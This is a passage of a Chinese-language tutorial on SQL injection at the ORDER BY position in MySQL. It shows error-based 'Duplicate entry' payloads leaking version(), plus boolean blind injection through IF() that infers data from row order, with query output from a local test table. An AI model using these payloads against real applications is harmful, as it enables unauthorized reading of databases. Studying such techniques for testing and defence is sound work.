+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165459330.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165459330.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165459330.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165459330.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 254;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h4 id="4duplicate-key报错" class="heading-element"><span>4）Duplicate key报错</span>
+  <a href="#4duplicate-key%e6%8a%a5%e9%94%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">26</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="s1">&#39;~&#39;</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1062</span><span class="w"> </span><span class="p">(</span><span class="mi">23000</span><span class="p">):</span><span class="w"> </span><span class="n">Duplicate</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="s1">&#39;5.7.26~1&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="s1">&#39;&lt;group_key&gt;&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">concat</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1062</span><span class="w"> </span><span class="p">(</span><span class="mi">23000</span><span class="p">):</span><span class="w"> </span><span class="n">Duplicate</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="s1">&#39;5.7.26~1&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="s1">&#39;&lt;group_key&gt;&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>mysql 8.0.31不适用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql&gt; select * from users order by (select 1 from (select count(*),concat(version(),&#39;~&#39;,floor(rand(0)*2))x from information_schema.tables group by x)a);
+</span></span><span class="line"><span class="cl">ERROR 1242 (21000): Subquery returns more than 1 row</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="5布尔盲注" class="heading-element"><span>5、布尔盲注</span>
+  <a href="#5%e5%b8%83%e5%b0%94%e7%9b%b2%e6%b3%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="1if" class="heading-element"><span>1）IF</span>
+  <a href="#1if" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>利用if语句</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="err">前面等式成立则按</span><span class="n">id列进行排序</span><span class="err">，不成立则按</span><span class="n">age列进行排序</span><span class="err">。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">id</span><span class="p">,</span><span class="n">age</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">aduser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">4</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="n">id</span><span class="p">,</span><span class="n">age</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">aduser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">4</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165613578.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165613578.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165613578.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165613578.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 596;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>可以看到这种方法，必须要知道列名，利用还是有条件的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="k">if</span><span class="p">((</span><span class="n">substr</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;8&#39;</span><span class="p">),</span><span class="n">id</span><span class="p">,</span><span class="n">age</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">aduser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">4</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="k">if</span><span class="p">((</span><span class="n">substr</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;6&#39;</span><span class="p">),</span><span class="n">id</span><span class="p">,</span><span class="n">age</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">aduser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">4</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
